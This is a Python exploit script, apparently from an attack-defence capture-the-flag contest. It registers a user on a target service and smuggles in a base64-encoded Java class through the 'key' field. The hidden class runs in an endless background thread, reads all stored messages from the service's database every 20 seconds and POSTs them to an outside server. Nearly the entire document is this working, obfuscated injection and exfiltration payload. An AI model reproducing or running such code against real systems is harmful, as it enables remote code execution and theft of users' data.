#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re,base64

def generator(size=20, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))


#ip = sys.argv[1]
ip = '10.61.21.2' + ':8080'

username = generator()
password = generator()

file = open('TempPWN12345.java', 'rb')


register = {"name": username, "color": "ffff01", "content": {"message": "0:0:0:0", "key": 'aW1wb3J0IGphdmEudXRpbC5BcnJheUxpc3Q7DQppbXBvcnQgamF2YS5uZXQuSHR0cFVSTENvbm5lY3Rpb247DQppbXBvcnQgamF2YS5uZXQuVVJMOw0KaW1wb3J0IGphdmEuaW8uRGF0YU91dHB1dFN0cmVhbTsNCmltcG9ydCBqYXZhLm5pby5jaGFyc2V0LlN0YW5kYXJkQ2hhcnNldHM7DQoNCnB1YmxpYyBjbGFzcyBUZW1wUFdOMTIzNDUgZXh0ZW5kcyBUaHJlYWQgew0KDQoJQE92ZXJyaWRlDQoJcHVibGljIHZvaWQgcnVuKCkgew0KCQl3aGlsZSAodHJ1ZSkgew0KCQkJdHJ5IHsNCgkJCQlBcnJheUxpc3Q8U3RyaW5nPiBtZXNzYWdlcyA9IG9yZy5qZXRicmFpbnMuZXhwb3NlZC5zcWwudHJhbnNhY3Rpb25zLlRocmVhZExvY2FsVHJhbnNhY3Rpb25NYW5hZ2VyS3QudHJhbnNhY3Rpb24oKG9yZy5qZXRicmFpbnMuZXhwb3NlZC5zcWwuRGF0YWJhc2UpIG51bGwsIHQgLT4gew0KCQkJCQlBcnJheUxpc3Q8U3RyaW5nPiBtZXNzYWdlc1QgPSBuZXcgQXJyYXlMaXN0PD4oKTsNCgkJCQkJZm9yIChtb2RlbHMuSW5mbyBpbmZvIDogbW9kZWxzLkluZm8uQ29tcGFuaW9uLmFsbCgpKSB7DQoJCQkJCQlTeXN0ZW0uZXJyLnByaW50bG4oaW5mby5nZXRNZXNzYWdlKCkpOw0KCQkJCQkJbWVzc2FnZXNULmFkZChpbmZvLmdldE1lc3NhZ2UoKSk7DQoJCQkJCX0NCgkJCQkJU3lzdGVtLmVyci5wcmludGxuKG1lc3NhZ2VzVC5zaXplKCkpOw0KCQkJCQlyZXR1cm4gbWVzc2FnZXNUOw0KCQkJCX0pOw0KCQkJCVN0cmluZ0J1aWxkZXIgdG90YWwgPSBuZXcgU3RyaW5nQnVpbGRlcigpOw0KCQkJCW1lc3NhZ2VzLnN0cmVhbSgpLmZvckVhY2goeCAtPiB7DQoJCQkJCXRvdGFsLmFwcGVuZCh4KS5hcHBlbmQoIiMiKTsNCgkJCQl9KTsNCgkJCQlTeXN0ZW0uZXJyLnByaW50bG4odG90YWwudG9TdHJpbmcoKSk7DQoJCQkJdHJ5IHsNCgkJCQkJU3RyaW5nIHVybFBhcmFtZXRlcnMgID0gdG90YWwudG9TdHJpbmcoKTsNCgkJCQkJYnl0ZVtdIHBvc3REYXRhICAgICAgID0gdXJsUGFyYW1ldGVycy5nZXRCeXRlcyggU3RhbmRhcmRDaGFyc2V0cy5VVEZfOCApOw0KCQkJCQlpbnQgICAgcG9zdERhdGFMZW5ndGggPSBwb3N0RGF0YS5sZW5ndGg7DQoJCQkJCVN0cmluZyByZXF1ZXN0ICAgICAgICA9ICJodHRwOi8vc2VydmVyLjE0ODgubWUvdGVzdC0xLnBocCI7DQoJCQkJCVVSTCAgICB1cmwgICAgICAgICAgICA9IG5ldyBVUkwoIHJlcXVlc3QgKTsNCgkJCQkJSHR0cFVSTENvbm5lY3Rpb24gY29ubj0gKEh0dHBVUkxDb25uZWN0aW9uKSB1cmwub3BlbkNvbm5lY3Rpb24oKTsgICAgICAgICAgIA0KCQkJCQljb25uLnNldERvT3V0cHV0KCB0cnVlICk7DQoJCQkJCWNvbm4uc2V0SW5zdGFuY2VGb2xsb3dSZWRpcmVjdHMoIGZhbHNlICk7DQoJCQkJCWNvbm4uc2V0UmVxdWVzdE1ldGhvZCggIlBPU1QiICk7DQoJCQkJCWNvbm4uc2V0UmVxdWVzdFByb3BlcnR5KCAiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOyANCgkJCQkJY29ubi5zZXRSZXF1ZXN0UHJvcGVydHkoICJjaGFyc2V0IiwgInV0Zi04Iik7DQoJCQkJCWNvbm4uc2V0UmVxdWVzdFByb3BlcnR5KCAiQ29udGVudC1MZW5ndGgiLCBJbnRlZ2VyLnRvU3RyaW5nKCBwb3N0RGF0YUxlbmd0aCApKTsNCgkJCQkJY29ubi5zZXRVc2VDYWNoZXMoIGZhbHNlICk7DQoJCQkJCXRyeShEYXRhT3V0cHV0U3RyZWFtIHdyID0gbmV3IERhdGFPdXRwdXRTdHJlYW0oIGNvbm4uZ2V0T3V0cHV0U3RyZWFtKCkpKSB7DQoJCQkJCSAgIHdyLndyaXRlKCBwb3N0RGF0YSApOw0KCQkJCQl9DQoJCQkJCWNvbm4uZ2V0SW5wdXRTdHJlYW0oKTsNCg0KCQkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7DQoJCQkJCS8vIGUucHJpbnRTdGFja1RyYWNlKFN5c3RlbS5lcnIpOw0KCQkJCX0NCgkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7DQoJCQkJLy8gZS5wcmludFN0YWNrVHJhY2UoU3lzdGVtLmVycik7DQoJCQl9DQoJCQl0cnkgew0KCQkJCVRocmVhZC5zbGVlcCgyMDAwMCk7DQoJCQl9IGNhdGNoIChFeGNlcHRpb24gZSkgew0KCQkJCQ0KCQkJfQ0KCQl9DQoJfQ0KDQoJcHVibGljIFRlbXBQV04xMjM0NSgpIHsNCgkJc3RhcnQoKTsNCgl9DQp9'}, "password": password, "speed": 0.1, "size": 10}

s = requests.Session()

html = s.post('http://{}/register'.format(ip), json=register)
print(html.text)